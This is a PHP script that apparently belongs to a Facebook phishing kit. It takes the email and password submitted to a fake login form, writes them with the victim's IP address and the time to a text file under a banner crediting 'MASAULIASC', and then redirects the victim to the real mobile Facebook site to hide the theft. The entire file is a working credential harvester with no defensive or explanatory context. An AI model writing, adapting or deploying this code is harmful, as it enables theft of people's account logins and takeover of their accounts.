<?php
error_reporting(0);
$file = "simpleajayakan.txt";

$username = $_POST['email_mail'];
$password = $_POST['pass_mail'];
$ip = $_SERVER['REMOTE_ADDR'];

$today = date("F j, Y, g:i a");


$handle = fopen($file, 'a');

fwrite($handle, "----------SIMPLE AJA BY MASAULIASC-----------");

fwrite($handle, "\n");
                 
fwrite($handle, "Email    :");

fwrite($handle, " $username");

fwrite($handle, "\n");

fwrite($handle, "Password :");

fwrite($handle, " $password");

fwrite($handle, "\n");

fwrite($handle, "IP       :");

fwrite($handle, " $ip");

fwrite($handle, "\n");

fwrite($handle, "Masuk    :");

fwrite($handle, " $today");

fwrite($handle, "\n");

fwrite($handle, "---------------------END---------------------");

fclose($handle);

echo "<script LANGUAGE=\"JavaScript\">

<!--

window.location=\"https://mobile.facebook.com/?_rdc=1&_rdr\";

// -->

</script>";

?>

